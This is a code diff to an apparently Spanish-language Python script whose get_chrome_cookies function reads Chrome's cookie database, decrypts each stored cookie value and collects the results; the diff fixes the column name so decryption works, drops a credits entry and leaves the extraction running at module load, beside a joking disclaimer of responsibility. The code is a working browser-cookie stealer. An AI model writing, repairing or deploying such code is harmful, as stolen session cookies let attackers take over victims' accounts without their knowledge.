@@ -73,12 +73,9 @@ def get_chrome_cookies():
             conn.close()
             continue
 
-        cursor.execute("SELECT host_key, name, path, encriptados FROM cookies")
+        cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
 
         cookies = []
-        cookies.append({
-            "Creditos, siempre etico:": "https://github.com/AguuZzz",
-        })
         for host_key, name, path, encriptados in cursor.fetchall():
             desencriptados = desencriptar(encriptados)
             cookies.append({
@@ -139,3 +136,4 @@ def save_to_html():
     webbrowser.open('file://' + os.path.realpath(outputpath))
 
 get_chrome_cookies() # NO me hago responsable de lo que suceda luego de ejecutar esta funcion jiji:)
+#save_to_html()
